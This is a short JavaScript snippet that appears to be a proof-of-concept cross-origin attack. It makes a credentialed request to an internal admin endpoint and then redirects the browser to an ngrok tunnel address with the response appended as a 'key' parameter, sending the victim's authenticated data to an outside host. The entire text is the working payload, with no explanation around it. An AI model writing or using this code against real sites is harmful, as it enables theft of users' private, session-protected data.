var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("POST", "https://192.168.0.68/admin");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//ab84-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
